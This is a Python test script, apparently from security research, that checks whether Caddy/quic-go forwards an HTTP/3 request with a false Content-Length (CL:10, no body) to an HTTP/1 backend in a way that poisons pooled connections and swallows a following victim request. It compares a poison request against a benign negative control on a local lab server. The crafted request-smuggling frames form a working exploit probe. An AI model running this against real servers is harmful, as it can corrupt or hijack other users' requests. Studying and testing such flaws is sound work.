"""Exploitability test for Caddy/quic-go's H3->H1 CL-lie. Caddy forwards CL:N with a
short/absent body (tap-confirmed). The question is whether the desynced backend conn is
POOLED (poisoning: the victim's first N bytes are eaten) or CLOSED by Go's transferWriter
(non-exploitable). Fire poison (standalone-FIN CL:10) then a marked victim; a clean victim
line at conn_bk = closed/not-exploitable; a mangled/eaten victim = real poisoning.
NEGATIVE CONTROL: a benign POST (CL matches body) must leave the victim clean."""
import asyncio
import os
import ssl
import sys
import time

sys.path.insert(0, "/home/j4kuuu/Desktop/tools/Phage/src")
from aioquic.asyncio.client import connect
from aioquic.h3.connection import H3_ALPN, H3Connection
from aioquic.quic.configuration import QuicConfiguration

from phage.evo import genome as G
from phage.evo.driver import drive

PORT = 4437
BK = "logs/conn_bk.log"


def sz():
    try:
        return os.path.getsize(BK)
    except OSError:
        return 0


def reqs(off):
    with open(BK, "rb") as f:
        f.seek(off)
        return [l for l in f.read().split(b"\n") if l.startswith(b"REQ ")]


async def _fire(genome):
    cfg = QuicConfiguration(is_client=True, alpn_protocols=H3_ALPN)
    cfg.verify_mode = ssl.CERT_NONE
    async with connect("127.0.0.1", PORT, configuration=cfg) as client:
        http = H3Connection(client._quic)
        sid = client._quic.get_next_available_stream_id()
        await drive(http, client._quic, sid, genome, transmit=client.transmit, raw=True)
        await asyncio.sleep(0.3)


def fire(genome):
    try:
        asyncio.new_event_loop().run_until_complete(_fire(genome))
    except Exception:
        pass
    time.sleep(0.4)


PRE = [(b":scheme", b"https"), (b":authority", b"lab")]


def poison():  # standalone-FIN: CL:10 declared, 0 body, then bare FIN
    return [G.Headers(tuple([(b":method", b"POST"), (b":path", b"/poison")] + PRE
            + [(b"content-length", b"10")]), end_stream=False), G.Fin()]


def benign_post():  # CL matches body (negative control): no lie
    return [G.Headers(tuple([(b":method", b"POST"), (b":path", b"/benign")] + PRE
            + [(b"content-length", b"4")]), end_stream=False),
            G.Data(b"AAAA", end_stream=True)]


def victim():
    return [G.Headers(tuple([(b":method", b"GET"),
            (b":path", b"/VICTIM_MARKER_ZZZ")] + PRE), end_stream=True)]


def trial(label, primer):
    for _ in range(3):  # prime the backend pool so a reused conn can carry the lie
        fire(primer)
    off = sz()
    fire(victim())
    v = reqs(off)
    clean = any(b"/VICTIM_MARKER_ZZZ" in r for r in v)
    print(f"[{label}] victim REQs={len(v)} {[r.decode(errors='replace') for r in v]}")
    print(f"    => {'CLEAN (victim intact, not poisoned)' if clean and len(v) == 1 else 'POISONED / anomaly'}")
    return clean and len(v) == 1


if __name__ == "__main__":
    # sanity: does poison forward the lie? (already tap-confirmed; here we just prime)
    print("POISON trial (standalone-FIN CL:10):")
    trial("poison", poison())
    print("\nNEGATIVE CONTROL (benign POST CL:4 body:4):")
    trial("benign", benign_post())
